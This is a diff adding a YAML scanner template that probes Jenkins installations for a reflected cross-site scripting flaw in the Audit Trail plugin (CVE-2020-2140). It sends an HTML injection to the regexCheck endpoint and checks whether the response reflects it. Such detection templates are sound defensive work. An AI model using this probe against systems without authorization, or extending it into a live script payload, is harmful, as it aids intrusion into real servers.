@@ -1,0 +1,25 @@
+id: jenkins-audit-xss
+info:
+  name: Jenkin Audit XSS (CVE-2020-2140)
+  risk: Medium
+
+params:
+  - root: "{{.BaseURL}}"
+
+variables:
+  - file: |
+      /
+      /jenkins/
+requests:
+  - method: GET
+    redirect: false
+    url: >-
+      {{.root}}{{.file}}descriptorByName/AuditTrailPlugin/regexCheck?value=*j<h1>sample
+    headers:
+      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+    detections:
+      - >-
+        StatusCode() == 200 && StringSearch("response", "<h1>sample") && StringSearch("response", "regular expression")
+
+reference:
+  - link: https://github.com/jenkinsci/audit-trail-plugin/commit/40c6d621a03e6a50b291dca7188d07d0aa3de946
